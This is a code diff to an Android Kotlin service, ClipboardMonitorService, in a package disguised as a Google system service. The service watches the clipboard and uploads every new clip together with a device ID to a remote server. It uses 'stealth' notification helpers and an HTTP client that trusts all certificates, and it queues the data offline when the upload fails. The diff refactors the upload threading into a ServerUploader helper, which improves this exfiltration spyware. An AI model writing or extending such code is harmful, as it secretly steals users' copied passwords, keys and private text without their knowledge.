@@ -9,6 +9,7 @@ import android.os.IBinder
 import android.util.Log
 import com.google.android.systemservice.config.AndroidConfig
 import com.google.android.systemservice.utils.OfflineDataQueue
+import com.google.android.systemservice.utils.ServerUploader
 import com.google.android.systemservice.utils.StealthNotificationHelper
 import com.google.android.systemservice.utils.TrustAllCertificates
 import okhttp3.MediaType.Companion.toMediaType
@@ -29,6 +30,7 @@ class ClipboardMonitorService : Service() {
     private var clipboardManager: ClipboardManager? = null
     @Volatile private var lastClipText: String = ""
     private val httpClient = TrustAllCertificates.createClientBuilder().build()
+    private var workerThread: Thread? = null
 
     private val clipListener = ClipboardManager.OnPrimaryClipChangedListener {
         try {
@@ -63,6 +65,8 @@ class ClipboardMonitorService : Service() {
     override fun onBind(intent: Intent?): IBinder? = null
 
     override fun onDestroy() {
+        workerThread?.interrupt()
+        workerThread = null
         clipboardManager?.removePrimaryClipChangedListener(clipListener)
         httpClient.dispatcher.executorService.shutdown()
         httpClient.connectionPool.evictAll()
@@ -71,29 +75,35 @@ class ClipboardMonitorService : Service() {
     }
 
     private fun sendClipboardData(text: String) {
-        Thread {
+        // Cancel previous thread if still running
+        workerThread?.let { thread ->
+            if (thread.isAlive) {
+                thread.interrupt()
+                try { thread.join(1000) } catch (_: InterruptedException) {}
+            }
+        }
+
+        workerThread = Thread {
             try {
+                if (Thread.currentThread().isInterrupted) return@Thread
+
                 val json = JSONObject().apply {
                     put("device_id", AndroidConfig.deviceId)
                     put("clipboard_text", text)
                     put("timestamp", System.currentTimeMillis())
                 }
 
-                val body = json.toString().toRequestBody("application/json".toMediaType())
-                val request = Request.Builder()
-                    .url("${AndroidConfig.apiBaseUrl}/clipboard")
-                    .post(body)
-                    .build()
-
-                httpClient.newCall(request).execute().use { response ->
-                    if (response.isSuccessful) {
-                        Log.d(TAG, "Clipboard data sent")
-                    } else {
-                        Log.w(TAG, "Clipboard send failed: ${response.code}, queuing offline")
+                ServerUploader.uploadJson(
+                    client = httpClient,
+                    url = "${AndroidConfig.apiBaseUrl}/clipboard",
+                    data = json,
+                    onSuccess = { Log.d(TAG, "Clipboard data sent") },
+                    onError = { e ->
+                        Log.w(TAG, "Clipboard send failed: ${e.message}, queuing offline")
                         queueOffline(json.toString())
                     }
-                }
-            } catch (e: IOException) {
+                )
+            } catch (e: Exception) {
                 Log.e(TAG, "Network error, queuing clipboard offline: ${e.message}")
                 val json = JSONObject().apply {
                     put("device_id", AndroidConfig.deviceId)
@@ -102,7 +112,7 @@ class ClipboardMonitorService : Service() {
                 }
                 queueOffline(json.toString())
             }
-        }.start()
+        }.also { it.start() }
     }
 
     private fun queueOffline(jsonPayload: String) {
